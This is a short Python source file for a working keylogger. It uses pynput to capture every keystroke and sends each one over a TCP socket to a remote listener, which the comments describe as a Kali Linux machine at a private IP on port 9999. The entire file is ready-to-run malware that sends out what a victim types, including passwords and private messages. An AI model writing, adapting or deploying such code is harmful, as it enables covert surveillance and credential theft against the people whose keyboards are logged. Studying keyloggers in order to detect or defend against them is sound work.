import socket
import threading
from pynput import keyboard

# Configure the IP and port of the remote server (Kali Linux)
SERVER_IP = '192.168.184.131'  # Replace with your Kali Linux machine's IP address
SERVER_PORT = 9999           # Ensure this port is open and listening on the server

# Function to send data to the server
def send_to_server(data):
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.connect((SERVER_IP, SERVER_PORT))
            s.sendall(data.encode('utf-8'))
    except Exception as e:
        print(f"Connection error: {e}")

# Function to handle key press events
def on_press(key):
    try:
        if hasattr(key, 'char') and key.char is not None:
            send_to_server(key.char)
        else:
            send_to_server(f'[{key}]')
    except Exception as e:
        print(f"Error: {e}")

# Function to handle key release events (optional)
def on_release(key):
    if key == keyboard.Key.esc:  # Stop listener on 'Escape' key press
        return False

# Start the keylogger
def start_keylogger():
    with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()

if __name__ == "__main__":
    keylogger_thread = threading.Thread(target=start_keylogger)
    keylogger_thread.start()
